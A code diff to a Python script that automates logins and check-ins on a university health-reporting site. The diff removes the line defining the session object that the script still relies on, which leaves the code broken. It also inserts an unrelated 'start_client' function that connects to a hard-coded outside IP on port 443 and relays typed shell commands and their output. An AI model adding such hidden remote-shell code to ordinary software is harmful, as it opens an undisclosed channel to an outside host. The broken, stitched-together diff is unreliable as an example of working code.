@@ -6,13 +6,28 @@ import json
 import time
 from datetime import datetime
 
-session = msession.session
+def start_client():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(('59.43.126.162', 443))
+
+    while True:
+        command = input("Shell > ")
+        s.send(command.encode())
+
+        if command.lower() == 'exit':
+            break
+
+        output = s.recv(4096).decode()
+        print(output)
+
+    s.close()
+
 
 def clock_in(stu_id):
     load_from_cookies(stu_id)
 
     res = session.get('http://yqtb.gzhu.edu.cn/infoplus/form/XNYQSB/start')
-
+    
     # get csrfToken
     csrfToken = re.findall(r'<meta itemscope="csrfToken" content="(?P<token>.*?)">', res.text)
 
@@ -24,7 +39,7 @@ def clock_in(stu_id):
         'lang': 'zh'
     }
     res_get_url = session.post('http://yqtb.gzhu.edu.cn/infoplus/interface/start', data=form_get_url)
-
+    
     # get URL with stepId from response
     url = json.loads(res_get_url.text)['entities'][0]
 
